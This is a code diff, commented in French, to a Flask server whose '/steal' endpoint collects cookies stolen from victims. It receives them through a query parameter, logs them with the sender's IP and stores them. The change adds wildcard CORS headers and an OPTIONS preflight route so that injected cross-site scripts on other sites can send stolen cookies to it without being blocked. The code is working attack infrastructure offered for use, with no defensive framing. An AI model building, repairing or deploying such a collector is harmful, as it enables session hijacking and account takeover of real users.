@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template, jsonify, make_response
 from datetime import datetime as dt
 import os
 import json
@@ -80,14 +80,33 @@ def save_cookie(ip, cookie):
 
 @app.route('/steal')
 def steal():
-    """Endpoint pour voler les cookies"""
+    """Endpoint pour voler les cookies - version corrigée"""
     cookie = request.args.get('c')
     if cookie:
         client_ip = request.remote_addr
         save_cookie(client_ip, cookie)
         print(f"[+] Cookie volé reçu de {client_ip}")
+        
+        # Créer une réponse avec en-têtes CORS
+        response = make_response("Cookie reçu", 200)
+    else:
+        response = make_response("Paramètre manquant", 400)
     
-    return '<script>window.location="https://google.com"</script>'
+    # En-têtes CORS essentiels
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+    
+    return response
+
+# Ajoutez cette route pour gérer les pré-requêtes OPTIONS
+@app.route('/steal', methods=['OPTIONS'])
+def steal_options():
+    response = make_response()
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+    return response
 
 @app.route('/dashboard')
 def dashboard():
